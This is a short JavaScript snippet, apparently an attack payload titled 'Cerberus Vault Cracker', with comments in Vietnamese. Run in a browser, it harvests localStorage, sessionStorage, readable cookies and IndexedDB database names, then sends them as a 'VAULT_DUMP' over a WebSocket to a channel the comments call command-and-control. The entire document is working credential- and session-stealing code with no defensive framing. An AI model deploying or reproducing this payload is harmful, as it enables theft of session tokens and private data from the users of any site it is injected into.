// CERBERUS VAULT CRACKER - SENSITIVE DATA EXFILTRATION
(function() {
    const exfilData = {};

    // 1. Vét sạch LocalStorage và SessionStorage
    exfilData.localStorage = JSON.stringify(localStorage);
    exfilData.sessionStorage = JSON.stringify(sessionStorage);

    // 2. Trích xuất Cookies (Chỉ những cookie không có cờ HttpOnly)
    exfilData.cookies = document.cookie;

    // 3. Khám phá IndexedDB (Cơ sở dữ liệu trình duyệt)
    indexedDB.databases().then(dbs => {
        exfilData.databases = dbs.map(db => db.name);
        
        // Gửi toàn bộ gói dữ liệu về C2
        const c2_ws = `ws://${location.host}`;
        const socket = new WebSocket(c2_ws);
        socket.onopen = () => {
            socket.send(JSON.stringify({
                type: 'VAULT_DUMP',
                content: exfilData
            }));
        };
    });
})();